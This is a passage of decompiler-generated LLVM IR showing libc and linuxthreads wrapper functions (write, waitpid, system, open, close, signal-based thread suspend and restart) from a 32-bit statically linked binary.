  %v3_8057f18 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057f18, i32 0)
  %v0_8057f1d = load i32, i32* @ebx, align 4
  %v2_8057f22 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057f22, i32* @ebx, align 4
  ret i32 %v0_8057f1d
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057f24 = load i32, i32* @ebx, align 4
  store i32 %v0_8057f24, i32* %stack_var_-4, align 4
  %v2_8057f28 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057f2f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057f28)
  %v3_8057f43 = call i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057f43, i32* @ebx, align 4
  %v3_8057f4e = load i32, i32* %stack_var_-8, align 4
  %v2_8057f52 = trunc i32 %v3_8057f4e to i8
  %v3_8057f52 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057f52, i32 0)
  %v0_8057f57 = load i32, i32* @ebx, align 4
  %v2_8057f5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057f5c, i32* @ebx, align 4
  ret i32 %v0_8057f57
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057f5e = load i32, i32* @ebx, align 4
  store i32 %v0_8057f5e, i32* %stack_var_-4, align 4
  %v2_8057f62 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057f69 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057f62)
  %v3_8057f7d = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8057f7d, i32* @ebx, align 4
  %v3_8057f88 = load i32, i32* %stack_var_-8, align 4
  %v2_8057f8c = trunc i32 %v3_8057f88 to i8
  %v3_8057f8c = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057f8c, i32 0)
  %v0_8057f91 = load i32, i32* @ebx, align 4
  %v2_8057f96 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057f96, i32* @ebx, align 4
  ret i32 %v0_8057f91
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057f9c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057fa3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057f9c)
  %v1_8057fad = call i32 @__libc_wait(i32 %arg1)
  store i32 %v1_8057fad, i32* @ebx, align 4
  %v3_8057fb8 = load i32, i32* %stack_var_-8, align 4
  %v2_8057fbc = trunc i32 %v3_8057fb8 to i8
  %v3_8057fbc = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057fbc, i32 0)
  %v0_8057fc1 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057fc1
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057fcc = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057fd3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057fcc)
  %v1_8057fdd = call i32 @__libc_tcdrain(i32 %arg1)
  store i32 %v1_8057fdd, i32* @ebx, align 4
  %v3_8057fe8 = load i32, i32* %stack_var_-8, align 4
  %v2_8057fec = trunc i32 %v3_8057fe8 to i8
  %v3_8057fec = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057fec, i32 0)
  %v0_8057ff1 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057ff1
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057ff8 = load i32, i32* @ebx, align 4
  store i32 %v0_8057ff8, i32* %stack_var_-4, align 4
  %v2_8057ffc = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058003 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057ffc)
  store i32 1, i32* @ecx, align 4
  %v1_805800d = call i32 @__libc_system(i32 %arg1)
  store i32 %v1_805800d, i32* @ebx, align 4
  %v3_8058018 = load i32, i32* %stack_var_-8, align 4
  %v2_805801c = trunc i32 %v3_8058018 to i8
  %v3_805801c = call i32 @__GI_pthread_setcanceltype(i8 %v2_805801c, i32 0)
  %v0_8058021 = load i32, i32* @ebx, align 4
  %v2_8058026 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058026, i32* @ebx, align 4
  ret i32 %v0_8058021
}

define i32 @read(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_805802c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058033 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_805802c)
  %v3_8058047 = call i32 @__libc_read(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8058047, i32* @ebx, align 4
  %v3_8058052 = load i32, i32* %stack_var_-8, align 4
  %v2_8058056 = trunc i32 %v3_8058052 to i8
  %v3_8058056 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058056, i32 0)
  %v0_805805b = load i32, i32* @ebx, align 4
  ret i32 %v0_805805b
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058066 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805806d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058066)
  %v4_8058082 = call i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8058082, i32* @ebx, align 4
  %v3_805808e = load i32, i32* %stack_var_-8, align 4
  %v2_8058092 = trunc i32 %v3_805808e to i8
  %v3_8058092 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058092, i32 0)
  %v0_8058097 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058097
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_80580a3 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg5, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v3_80580b2 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80580a3)
  %v0_80580b7 = load i32, i32* @esi, align 4
  %v0_80580ba = load i32, i32* @ebx, align 4
  %v5_80580c7 = call i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_80580ba, i32 %v0_80580b7)
  store i32 %v5_80580c7, i32* @ebx, align 4
  %v3_80580d3 = load i32, i32* %stack_var_-12, align 4
  %v2_80580d7 = trunc i32 %v3_80580d3 to i8
  %v3_80580d7 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80580d7, i32 0)
  %v0_80580dc = load i32, i32* @ebx, align 4
  ret i32 %v0_80580dc
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80580e8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80580ef = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80580e8)
  %v4_8058104 = call i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8058104, i32* @ebx, align 4
  %v3_8058110 = load i32, i32* %stack_var_-8, align 4
  %v2_8058114 = trunc i32 %v3_8058110 to i8
  %v3_8058114 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058114, i32 0)
  %v0_8058119 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058119
}

define i32 @pause(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058124 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805812b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058124)
  %v0_8058130 = call i32 @__libc_pause()
  store i32 1, i32* @ecx, align 4
  store i32 %v0_8058130, i32* @ebx, align 4
  %v3_805813b = load i32, i32* %stack_var_-8, align 4
  %v2_805813f = trunc i32 %v3_805813b to i8
  %v3_805813f = call i32 @__GI_pthread_setcanceltype(i8 %v2_805813f, i32 0)
  %v0_8058144 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058144
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805814f = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058156 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_805814f)
  %v3_8058172 = trunc i32 %arg2 to i8
  %v4_8058172 = call i32 @__GI___libc_open64(i32 %arg1, i8 %v3_8058172, i32 %arg3)
  store i32 %v4_8058172, i32* @ebx, align 4
  %v3_805817d = load i32, i32* %stack_var_-8, align 4
  %v2_8058181 = trunc i32 %v3_805817d to i8
  %v3_8058181 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058181, i32 0)
  %v0_8058186 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058186
}

define i32 @open(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058191 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058198 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058191)
  %v3_80581b4 = trunc i32 %tmp1 to i8
  %v4_80581b4 = call i32 @__libc_open(i32 %arg1, i8 %v3_80581b4, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v4_80581b4, i32* @ebx, align 4
  %v3_80581bf = load i32, i32* %stack_var_-8, align 4
  %v2_80581c3 = trunc i32 %v3_80581bf to i8
  %v3_80581c3 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80581c3, i32 0)
  %v0_80581c8 = load i32, i32* @ebx, align 4
  ret i32 %v0_80581c8
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80581cf = load i32, i32* @ebx, align 4
  store i32 %v0_80581cf, i32* %stack_var_-4, align 4
  %v2_80581d3 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80581da = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80581d3)
  store i32 %v2_80581d3, i32* @ebx, align 4
  %v2_80581e9 = call i32 @__libc_nanosleep(i32 %arg1, i32 %arg2)
  store i32 %v2_80581e9, i32* @ebx, align 4
  %v3_80581f4 = load i32, i32* %stack_var_-8, align 4
  %v2_80581f8 = trunc i32 %v3_80581f4 to i8
  %v3_80581f8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80581f8, i32 0)
  %v0_80581fd = load i32, i32* @ebx, align 4
  %v2_8058202 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058202, i32* @ebx, align 4
  ret i32 %v0_80581fd
}

define i32 @msync(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058208 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805820f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058208)
  %v3_8058223 = call i32 @__libc_msync(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8058223, i32* @ebx, align 4
  %v3_805822e = load i32, i32* %stack_var_-8, align 4
  %v2_8058232 = trunc i32 %v3_805822e to i8
  %v3_8058232 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058232, i32 0)
  %v0_8058237 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058237
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_8058243 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v3_8058252 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058243)
  %v0_805825b = load i32, i32* @esi, align 4
  %v0_805825c = load i32, i32* @ebx, align 4
  %v4_8058261 = call i32 @__libc_lseek64(i32 %arg1, i32 %v0_805825c, i32 %v0_805825b, i32 %arg4)
  store i32 %v4_8058261, i32* @ebx, align 4
  %v3_805826d = load i32, i32* %stack_var_-12, align 4
  %v0_8058271 = load i32, i32* @edx, align 4
  store i32 %v0_8058271, i32* @esi, align 4
  %v2_8058273 = trunc i32 %v3_805826d to i8
  %v3_8058273 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058273, i32 0)
  %v0_8058278 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058278
}

define i32 @lseek(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058286 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805828d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058286)
  %v3_80582a1 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_80582a1, i32* @ebx, align 4
  %v3_80582ac = load i32, i32* %stack_var_-8, align 4
  %v2_80582b0 = trunc i32 %v3_80582ac to i8
  %v3_80582b0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80582b0, i32 0)
  %v0_80582b5 = load i32, i32* @ebx, align 4
  ret i32 %v0_80582b5
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80582c0 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80582c7 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80582c0)
  store i32 1, i32* @ecx, align 4
  %v1_80582d1 = call i32 @__libc_fsync(i32 %arg1)
  store i32 %v1_80582d1, i32* @ebx, align 4
  %v3_80582dc = load i32, i32* %stack_var_-8, align 4
  %v2_80582e0 = trunc i32 %v3_80582dc to i8
  %v3_80582e0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80582e0, i32 0)
  %v0_80582e5 = load i32, i32* @ebx, align 4
  ret i32 %v0_80582e5
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80582ec = load i32, i32* @ebx, align 4
  store i32 %v0_80582ec, i32* %stack_var_-4, align 4
  %v2_80582f0 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80582f7 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80582f0)
  %v3_8058313 = call i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8058313, i32* @ebx, align 4
  %v3_805831e = load i32, i32* %stack_var_-8, align 4
  %v2_8058322 = trunc i32 %v3_805831e to i8
  %v3_8058322 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058322, i32 0)
  %v0_8058327 = load i32, i32* @ebx, align 4
  %v2_805832c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805832c, i32* @ebx, align 4
  ret i32 %v0_8058327
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805832e = load i32, i32* @ebx, align 4
  store i32 %v0_805832e, i32* %stack_var_-4, align 4
  %v2_8058332 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058339 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058332)
  %v1_8058343 = call i32 @__libc_close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_8058343, i32* @ebx, align 4
  %v3_805834e = load i32, i32* %stack_var_-8, align 4
  %v2_8058352 = trunc i32 %v3_805834e to i8
  %v3_8058352 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058352, i32 0)
  %v0_8058357 = load i32, i32* @ebx, align 4
  %v2_805835c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805835c, i32* @ebx, align 4
  ret i32 %v0_8058357

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 34, 35, 0, 1, 2, 3, 4, 5, 6, 7, 52, 53, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 38, 39, 22, 23, 24, 25, 32, 33, 50, 51, 46, 47, 42, 43, 48, 49, 26, 27, 28, 29, 36, 37, 30, 31, 40, 41 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v0_8058360 = load i32, i32* @global_var_80745f8.656, align 8
  ret i32 %v0_8058360
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v0_8058366 = load i32, i32* @global_var_80745fc.657, align 4
  ret i32 %v0_8058366
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805836c = load i32, i32* @global_var_80745f8.656, align 8
  %v1_8058372 = add i32 %v0_805836c, 1
  %v10_8058372 = icmp eq i32 %v1_8058372, 0
  br i1 %v10_8058372, label %dec_label_pc_805839e, label %dec_label_pc_8058377

dec_label_pc_8058377:                             ; preds = %entry
  %v0_8058377 = load i32, i32* @global_var_80745fc.657, align 4
  %v8_805837f = icmp sgt i32 %v0_805836c, %v0_8058377
  br i1 %v8_805837f, label %dec_label_pc_805839e, label %dec_label_pc_8058381

dec_label_pc_8058381:                             ; preds = %dec_label_pc_8058377
  %v4_8058381 = icmp eq i32 %arg1, 0
  br i1 %v4_8058381, label %dec_label_pc_8058392, label %dec_label_pc_8058388

dec_label_pc_8058388:                             ; preds = %dec_label_pc_8058381
  store i32 %v1_8058372, i32* @global_var_80745f8.656, align 8
  br label %dec_label_pc_80583a1

dec_label_pc_8058392:                             ; preds = %dec_label_pc_8058381
  %v1_8058392 = add i32 %v0_8058377, -1
  store i32 %v1_8058392, i32* @global_var_80745fc.657, align 4
  br label %dec_label_pc_80583a1

dec_label_pc_805839e:                             ; preds = %dec_label_pc_8058377, %entry
  br label %dec_label_pc_80583a1

dec_label_pc_80583a1:                             ; preds = %dec_label_pc_8058392, %dec_label_pc_8058388, %dec_label_pc_805839e
  %v0_80583a1 = phi i32 [ %v0_8058377, %dec_label_pc_8058392 ], [ %v0_805836c, %dec_label_pc_8058388 ], [ -1, %dec_label_pc_805839e ]
  ret i32 %v0_80583a1

; uselistorder directives
  uselistorder label %dec_label_pc_80583a1, { 2, 0, 1 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v15_80583a8 = icmp eq i32 %arg1, %arg2
  %v1_80583ac = zext i1 %v15_80583a8 to i32
  ret i32 %v1_80583ac
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_80583b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80583b3
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_8078e84.658, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v0_80583c0 = load i32, i32* @global_var_8078e84.658, align 4
  ret i32 %v0_80583c0
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = call i64 @__decompiler_undefined_function_4()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80583c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80583c6, i32* %stack_var_-4, align 4
  %v2_80583cf = ptrtoint i32* %stack_var_-432 to i32
  %v3_80583d4 = call i32 @__sigsetjmp(i32 %v2_80583cf, i32* inttoptr (i32 1 to i32*))
  store i32 1, i32* @edx, align 4
  %v1_80583e1 = icmp eq i32 %v3_80583d4, 0
  %v1_80583e3 = icmp eq i1 %v1_80583e1, false
  br i1 %v1_80583e3, label %entry.dec_label_pc_80584c8_crit_edge, label %dec_label_pc_80583e9

entry.dec_label_pc_80584c8_crit_edge:             ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre4 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_80584c8

dec_label_pc_80583e9:                             ; preds = %entry
  %tmp6 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_80583f7 = add i32 %arg1, 36
  %v3_80583f7 = inttoptr i32 %v2_80583f7 to i32*
  store i32 %v2_80583cf, i32* %v3_80583f7, align 4
  %v0_80583fa = load i32, i32* %edx.global-to-local, align 4
  %v1_80583fa = add i32 %v0_80583fa, 32
  %v2_80583fa = inttoptr i32 %v1_80583fa to i32*
  store i32 0, i32* %v2_80583fa, align 4
  %v2_8058401 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_8058401, i32* @ebx, align 4
  %v1_8058409 = call i32 @sigemptyset(i32 %v2_8058401)
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8058410 = load i32, i32* @global_var_8074528.652, align 8
  %v2_8058417 = call i32 @__GI_sigaddset(i32 %v2_8058401, i32 %v0_8058410)
  %v2_805841f = ptrtoint i32* %stack_var_-276 to i32
  %v3_805842a = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_805842a = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_805842a, i32 %v2_805841f)
  %v2_8058436 = ptrtoint i32* %stack_var_-12 to i32
  %v7_8058443 = mul nsw i64 %tmp7, 1000
  %v8_8058443 = trunc i64 %v7_8058443 to i32
  %v1_8058455 = add i32 %tmp6, 4
  %v2_8058455 = inttoptr i32 %v1_8058455 to i32*
  %v2_805849d = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8058432

dec_label_pc_8058432:                             ; preds = %dec_label_pc_8058499, %dec_label_pc_80583e9
  %v0_8058432 = load i32, i32* @ecx, align 4
  %v4_805843e = call i32 @gettimeofday(i32 %v2_8058436, i32 0, i32 %v0_8058432, i32 %v0_8058432)
  %v3_8058455 = load i32, i32* %v2_8058455, align 4
  store i32 %v3_8058455, i32* %edx.global-to-local, align 4
  %v2_8058458 = load i32, i32* %arg2, align 4
  %v4_805845a = load i32, i32* %stack_var_-12, align 4
  %v5_805845a = sub i32 %v2_8058458, %v4_805845a
  %v2_8058461 = sub i32 %v3_8058455, %v8_8058443
  %v13_8058461 = icmp slt i32 %v2_8058461, 0
  store i32 %v2_8058461, i32* %edx.global-to-local, align 4
  %v1_8058476 = icmp eq i1 %v13_8058461, false
  br i1 %v1_8058476, label %dec_label_pc_805848f, label %dec_label_pc_8058478

dec_label_pc_8058478:                             ; preds = %dec_label_pc_8058432
  %v1_8058485 = add i32 %v5_805845a, -1
  br label %dec_label_pc_805848f

dec_label_pc_805848f:                             ; preds = %dec_label_pc_8058432, %dec_label_pc_8058478
  %storemerge = phi i32 [ %v1_8058485, %dec_label_pc_8058478 ], [ %v5_805845a, %dec_label_pc_8058432 ]
  %v3_805848f = phi i32 [ %v1_8058485, %dec_label_pc_8058478 ], [ %v5_805845a, %dec_label_pc_8058432 ]
  store i32 %storemerge, i32* %stack_var_-20, align 4
  %v5_805848f = icmp slt i32 %v3_805848f, 0
  br i1 %v5_805848f, label %dec_label_pc_80584b1, label %dec_label_pc_8058499

dec_label_pc_8058499:                             ; preds = %dec_label_pc_805848f
  %v2_80584a5 = call i32 @__libc_nanosleep(i32 %v2_805849d, i32 0)
  %v1_80584ad = icmp eq i32 %v2_80584a5, 0
  %v1_80584af = icmp eq i1 %v1_80584ad, false
  br i1 %v1_80584af, label %dec_label_pc_8058432, label %dec_label_pc_80584b1

dec_label_pc_80584b1:                             ; preds = %dec_label_pc_8058499, %dec_label_pc_805848f
  %v3_80584be = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_80584be = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80584be, i32 0)
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_80584c8

dec_label_pc_80584c8:                             ; preds = %entry.dec_label_pc_80584c8_crit_edge, %dec_label_pc_80584b1
  %v2_80584cf.pre-phi = phi i32* [ %.pre4, %entry.dec_label_pc_80584c8_crit_edge ], [ %v3_80583f7, %dec_label_pc_80584b1 ]
  store i32 %arg1, i32* @ecx, align 4
  store i32 0, i32* %v2_80584cf.pre-phi, align 4
  %v0_80584d6 = load i32, i32* @edx, align 4
  %v2_80584de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80584de, i32* @ebx, align 4
  ret i32 %v0_80584d6

; uselistorder directives
  uselistorder i32 %v1_8058485, { 1, 0 }
  uselistorder i32 %v5_805845a, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32*)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80584c8, { 1, 0 }
  uselistorder label %dec_label_pc_805848f, { 1, 0 }
}

define i32 @__pthread_restart_new(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80584e3 = load i32, i32* @global_var_8074528.652, align 8
  %v1_80584ed = add i32 %arg1, 20
  %v2_80584ed = inttoptr i32 %v1_80584ed to i32*
  %v3_80584ed = load i32, i32* %v2_80584ed, align 4
  %v2_80584f0 = call i32 @kill(i32 %v3_80584ed, i32 %v0_80584e3)
  ret i32 %v2_80584f0
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80584f9 = load i32, i32* @esi, align 4
  %v0_80584fa = load i32, i32* @ebx, align 4
  store i32 %v0_80584fa, i32* %stack_var_-8, align 4
  %v2_8058501 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8058501, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8058511 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_8058501)
  %v1_805851f = call i32 @__GI_sigdelset(i32 %v2_8058501)
  %v0_8058524 = load i32, i32* @esi, align 4
  %v1_8058524 = add i32 %v0_8058524, 32
  %v2_8058524 = inttoptr i32 %v1_8058524 to i32*
  store i32 0, i32* %v2_8058524, align 4
  %v1_8058536 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_805852e

dec_label_pc_805852e:                             ; preds = %dec_label_pc_805852e, %entry
  %v2_8058536 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_8058536)
  %v0_805853b = load i32, i32* @esi, align 4
  %v1_805853b = add i32 %v0_805853b, 32
  %v2_805853b = inttoptr i32 %v1_805853b to i32*
  %v3_805853b = load i32, i32* %v2_805853b, align 4
  %v1_8058541 = load i32, i32* @global_var_8074528.652, align 8
  %v12_8058541 = icmp eq i32 %v3_805853b, %v1_8058541
  %v1_8058547 = icmp eq i1 %v12_8058541, false
  br i1 %v1_8058547, label %dec_label_pc_805852e, label %dec_label_pc_8058549

dec_label_pc_8058549:                             ; preds = %dec_label_pc_805852e
  %v2_805854f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805854f, i32* @ebx, align 4
  store i32 %v0_80584f9, i32* @esi, align 4
  ret i32 %v3_805853b

; uselistorder directives
  uselistorder i32 %v3_805853b, { 1, 0 }
  uselistorder i32 %v2_8058501, { 1, 0, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @suspend.6() local_unnamed_addr {
entry:
  %v0_8058555 = load i32, i32* @eax, align 4
  %v1_8058556 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8058555)
  ret i32 %v1_8058556
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_805855f = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805855f, i32* @ecx, align 4
  br label %dec_label_pc_805856b

dec_label_pc_8058568:                             ; preds = %dec_label_pc_8058572, %dec_label_pc_805856b
  %v1_8058568 = add i32 %v0_8058568, 16
  br label %dec_label_pc_805856b

dec_label_pc_805856b:                             ; preds = %entry, %dec_label_pc_8058568
  %v0_8058568 = phi i32 [ ptrtoint (i32* @global_var_8070160.659 to i32), %entry ], [ %v1_8058568, %dec_label_pc_8058568 ]
  store i32 %v0_8058568, i32* @edx, align 4
  %v1_805856b = add i32 %v0_8058568, 8
  %v2_805856b = inttoptr i32 %v1_805856b to i32*
  %v3_805856b = load i32, i32* %v2_805856b, align 4
